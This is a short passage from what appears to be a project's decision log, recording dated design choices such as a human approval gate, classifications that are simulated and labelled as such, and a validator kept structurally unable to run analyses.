  justified by the human gate; now additionally justified by section 8.
  (2026-07-14, reaffirmed)
- **Classifications are simulated and labelled as such.** No pretending public
  data is confidential. (2026-07-17)
- **The validator cannot run analyses.** Independence is structural, not
  procedural. (2026-07-17)
